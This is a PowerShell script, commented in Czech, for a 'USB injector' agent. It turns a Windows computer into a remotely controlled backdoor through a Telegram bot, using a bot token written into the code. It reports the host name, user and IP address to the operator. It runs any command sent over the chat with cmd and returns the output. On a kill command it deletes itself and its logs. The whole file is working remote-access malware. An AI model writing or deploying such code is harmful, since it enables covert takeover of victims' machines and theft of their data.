# ============================================
# USB INJECTOR - TELEGRAM AGENT
# ============================================

# MARKER SOUBOR - signalizuje Arduinu že agent běží
"RUNNING" | Out-File -FilePath "C:\agent_running.marker" -Force -Encoding UTF8

$botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
$stateFile = "C:\agent_state.txt"
$logFile = "C:\agent_log.txt"
$chatId = $null

function Write-Log($msg) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
    Write-Host $msg
}

Write-Log "=== AGENT START ==="

# Načti uložený stav (pokud existuje)
if(Test-Path $stateFile) {
    try {
        $savedState = Get-Content $stateFile -Raw -Encoding UTF8 | ConvertFrom-Json
        $lastUpdateId = $savedState.lastUpdateId
        $chatId = $savedState.chatId
        Write-Log "Obnovuji stav: updateId=$lastUpdateId, chatId=$chatId"
    } catch {
        Write-Log "ERROR pri nacitani stavu: $_"
        $lastUpdateId = 0
    }
} else {
    Write-Log "Prvni spusteni - preskakuji stare zpravy"
    try {
        $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates?timeout=1" -Method Get -TimeoutSec 5
        if($response.result.Count -gt 0) {
            $lastUpdateId = ($response.result | Select-Object -Last 1).update_id
            Write-Log "Posledni update_id: $lastUpdateId (preskoceno $($response.result.Count) starych zprav)"
        } else {
            $lastUpdateId = 0
            Write-Log "Zadne stare zpravy"
        }
    } catch {
        Write-Log "ERROR pri ziskavani update_id: $_"
        $lastUpdateId = 0
    }
}

function Save-State {
    try {
        $state = @{
            lastUpdateId = $lastUpdateId
            chatId = $chatId
        } | ConvertTo-Json
        $state | Out-File -FilePath $stateFile -Force -Encoding UTF8
        Write-Log "Stav ulozen: updateId=$lastUpdateId"
    } catch {
        Write-Log "ERROR pri ukladani stavu: $_"
    }
}

function Clean-Text($text) {
    # Odstranit všechny non-ASCII znaky a nahradit je '?'
    $text = $text -replace '[^\x00-\x7F]','?'
    return $text
}

function Send-Message($text) {
    if(!$chatId){
        Write-Log "ERROR: chatId neni nastaveno"
        return
    }
    
    Write-Log "Odesilam zpravu do chatId=$chatId"
    
    # Vyčisti text od problematických znaků
    $text = Clean-Text $text
    
    # Escape JSON znaky
    $text = $text -replace '\\','\\' -replace '"','\"' -replace "`n",'\n' -replace "`r",''
    
    $json = "{`"chat_id`":`"$chatId`",`"text`":`"$text`"}"
    
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType 'application/json; charset=utf-8' -Body ([System.Text.Encoding]::UTF8.GetBytes($json)) -ErrorAction Stop | Out-Null
        Write-Log "Zprava odeslana OK"
    } catch {
        Write-Log "ERROR pri odesilani zpravy: $_"
    }
}

Write-Log "Vstupuji do hlavni smycky"
$loopCount = 0

while($true) {
    try {
        $loopCount++
        if($loopCount % 10 -eq 0) {
            Write-Log "Smycka #$loopCount - stale bezim..."
        }
        
        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$($lastUpdateId+1)&timeout=10"
        $response = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 15
        
        if($response.result.Count -gt 0) {
            Write-Log "Prijato zprav: $($response.result.Count)"
        }
        
        foreach($update in $response.result) {
            $lastUpdateId = $update.update_id
            Write-Log "Zpracovavam update_id: $lastUpdateId"
            Save-State
            
            if(!$chatId -and $update.message.chat.id) {
                $chatId = $update.message.chat.id
                Write-Log "ChatID nastaven: $chatId"
                Save-State
                Send-Message "[ONLINE] USB Injector Agent aktivni`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`n`nZadej prikaz nebo /help"
            }
            
            $cmd = $update.message.text
            if(!$cmd){
                Write-Log "Zprava neobsahuje text"
                continue
            }
            
            Write-Log "Prijat prikaz: $cmd"
            
            if($cmd -eq '/start') {
                Send-Message "System aktivni"
            } elseif($cmd -eq '/status') {
                $pc = $env:COMPUTERNAME
                $user = $env:USERNAME
                try {
                    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*"} | Select-Object -First 1).IPAddress
                } catch {
                    $ip = "neznama"
                }
                Send-Message "[STATUS]`nPC: $pc`nUser: $user`nIP: $ip`nOnline"
            } elseif($cmd -eq '/help') {
                Send-Message "Prikazy:`n/status - Info o PC`n/help - Napoveda`n/log - Zobraz log`n/kill - Ukonci agenta`n`nZadej CMD prikaz (ipconfig, dir, whoami, tasklist...)"
            } elseif($cmd -eq '/log') {
                if(Test-Path $logFile) {
                    $logContent = Get-Content $logFile -Encoding UTF8 | Select-Object -Last 30 | Out-String
                    if($logContent.Length -gt 3500) {
                        $logContent = $logContent.Substring($logContent.Length - 3500)
                    }
                    Send-Message "[LOG - poslednich 30 radku]`n`n$logContent"
                } else {
                    Send-Message "Log soubor neexistuje"
                }
            } elseif($cmd -eq '/kill') {
                Write-Log "Ukoncuji se..."
                Send-Message "Agent se ukoncuje..."
                Remove-Item "C:\agent.ps1" -Force -ErrorAction SilentlyContinue
                Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
                Remove-Item $logFile -Force -ErrorAction SilentlyContinue
                Remove-Item "C:\agent_running.marker" -Force -ErrorAction SilentlyContinue
                exit
            } else {
                Write-Log "Vykonavani prikazu: $cmd"
                Send-Message "[EXECUTING] $cmd"
                try {
                    # Ulož výstup do dočasného souboru
                    $tempFile = [System.IO.Path]::GetTempFileName()
                    
                    # Spusť příkaz a ulož do souboru
                    cmd /c "$cmd > `"$tempFile`" 2>&1"
                    $exitCode = $LASTEXITCODE
                    
                    Write-Log "Prikaz dokoncen s exit code: $exitCode"
                    
                    # Načti soubor
                    if(Test-Path $tempFile) {
                        $output = Get-Content $tempFile -Raw -Encoding Default
                        Remove-Item $tempFile -Force
                    } else {
                        $output = ""
                    }
                    
                    # Vyčisti output
                    $output = Clean-Text $output
                    $output = $output.Trim()
                    
                    if($output) {
                        $result = "[EXIT: $exitCode]`n`n$output"
                        if($result.Length -gt 3500) {
                            $result = $result.Substring(0,3500) + "`n...(zkraceno)"
                        }
                        Send-Message $result
                    } else {
                        Send-Message "[EXIT: $exitCode]`n(zadny vystup)"
                    }
                } catch {
                    Write-Log "ERROR pri vykonavani prikazu: $_"
                    Send-Message "[ERROR] $($_.Exception.Message)"
                }
            }
        }
    } catch {
        Write-Log "ERROR ve smycce: $_"
        Start-Sleep -Seconds 5
    }
}
